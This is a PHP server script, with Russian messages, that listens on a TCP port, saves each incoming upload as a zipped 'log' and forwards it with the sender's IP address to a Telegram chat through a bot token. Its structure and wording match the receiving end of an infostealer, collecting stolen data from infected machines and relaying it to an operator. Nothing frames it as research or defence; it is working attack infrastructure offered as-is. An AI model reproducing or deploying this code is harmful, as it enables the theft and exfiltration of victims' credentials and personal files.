<?php

$address = "127.0.0.1";
$port = 12345;
$botToken = "TOKEN";
$chatId = "CHAT ID";


$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
if ($socket === false) {
    echo "Ошибка создания сокета: " . socket_strerror(socket_last_error()) . "\n";
    exit(1);
}

$result = socket_bind($socket, $address, $port);
if ($result === false) {
    echo "Ошибка связывания сокета с адресом: " . socket_strerror(socket_last_error()) . "\n";
    exit(1);
}

$result = socket_listen($socket, 5);
if ($result === false) {
    echo "Ошибка прослушивания сокета: " . socket_strerror(socket_last_error()) . "\n";
    exit(1);
}

echo "Сервер запущен и ожидает подключения...\n";

function readNextBytes($clientSocket) {
    $buffer = '';
    while ($chunk = socket_read($clientSocket, 1024)) {
        $buffer .= $chunk;
    }
    return $buffer;
}

function sendFileToTelegram($filePath, $botToken, $chatId, $caption = '') {
    $url = "https://api.telegram.org/bot{$botToken}/sendDocument";
    $file = new CURLFile($filePath);

    $data = array(
        'chat_id' => $chatId,
        'document' => $file,
        'caption' => $caption
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

while (true) {
    $clientSocket = socket_accept($socket);
    if ($clientSocket === false) {
        echo "Ошибка при принятии соединения: " . socket_strerror(socket_last_error()) . "\n";
        continue;
    }

    $clientAddress = '';
    socket_getpeername($clientSocket, $clientAddress);

    $bytes = readNextBytes($clientSocket);

    $filename = generateRandomFilename() . ".zip";

    $pathStr = "LOGS/{$filename}";

    if (!is_dir('LOGS')) {
        mkdir('LOGS', 0777, true);
    }

    $file = fopen($pathStr, 'w+');
    if ($file === false) {
        echo "Ошибка при открытии файла: $pathStr\n";
        continue;
    }

    fwrite($file, $bytes);
    fclose($file);

    $message = "Получен новый лог, IP клиента: {$clientAddress}";
    sendFileToTelegram($pathStr, $botToken, $chatId, $message);

    socket_close($clientSocket);
}

socket_close($socket);

function generateRandomFilename() {
    $charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-";
    $length = 20;
    $filename = '';
    $charsetLength = strlen($charset);
    for ($i = 0; $i < $length; $i++) {
        $filename .= $charset[rand(0, $charsetLength - 1)];
    }
    return $filename;
}